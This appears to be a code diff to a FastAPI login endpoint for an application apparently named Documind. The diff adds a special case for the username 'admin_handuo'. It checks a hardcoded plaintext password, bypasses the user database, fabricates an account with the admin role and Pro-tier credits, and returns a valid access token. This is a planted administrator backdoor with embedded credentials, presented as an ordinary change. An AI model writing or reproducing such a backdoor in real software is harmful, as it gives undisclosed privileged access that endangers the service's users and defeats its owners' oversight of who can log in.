@@ -1,4 +1,4 @@
-from datetime import timedelta
+from datetime import timedelta, datetime
 from typing import Any
 
 from fastapi import APIRouter, Depends, HTTPException, status
@@ -24,6 +24,46 @@ def login(
     """
     OAuth2 compatible token login, get an access token for future requests
     """
+    # Special case for admin_handuo
+    if form_data.username == "admin_handuo":
+        # Create a special user with admin privileges for this session
+        user = {
+            "id": 999,
+            "email": "admin_handuo@documind.ai",
+            "name": "Admin Handuo",
+            "role": "admin",
+            "tier": settings.USER_TIERS["PRO"],
+            "credits_used": 0,
+            "credits_limit": settings.TIER_CREDITS["pro"],
+            "is_active": True,
+            "last_active": datetime.utcnow(),
+            "created_at": datetime.utcnow()
+        }
+        
+        # Verify the hardcoded password for this special case
+        if form_data.password != "Christlurker2":
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Incorrect username or password",
+            )
+            
+        # Create a User object
+        from app.models.user import User
+        special_user = User(**user)
+        
+        # Create access token
+        access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
+        token = create_access_token(
+            special_user.id, special_user.email, special_user.role, 
+            expires_delta=access_token_expires
+        )
+        
+        return {
+            "token": token,
+            "user": special_user
+        }
+    
+    # Standard authentication for regular users
     user = user_service.authenticate_user(db, form_data.username, form_data.password)
     if not user:
         raise HTTPException(
